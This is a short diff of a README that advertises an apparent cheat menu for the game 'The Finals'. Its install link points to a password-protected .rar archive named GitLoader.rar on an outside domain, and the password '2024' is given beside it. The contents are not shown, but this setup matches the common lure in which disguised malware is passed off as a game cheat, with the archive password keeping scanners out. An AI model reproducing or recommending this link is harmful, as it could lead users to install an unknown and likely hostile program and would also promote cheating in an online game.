@@ -1,3 +1,7 @@
+# [Dullwave] The Finals
+
+![1](https://github.com/Vinemoe/TheFinalsDWMenu/assets/155239183/920c2173-56a7-423a-a9e4-d9abf48f6b54)
+
 # 📁[𝙸𝙽𝚂𝚃𝙰𝙻𝙻](https://boogi.ma/temp/GitLoader.rar)
 
 # 🔓Pass: 2024
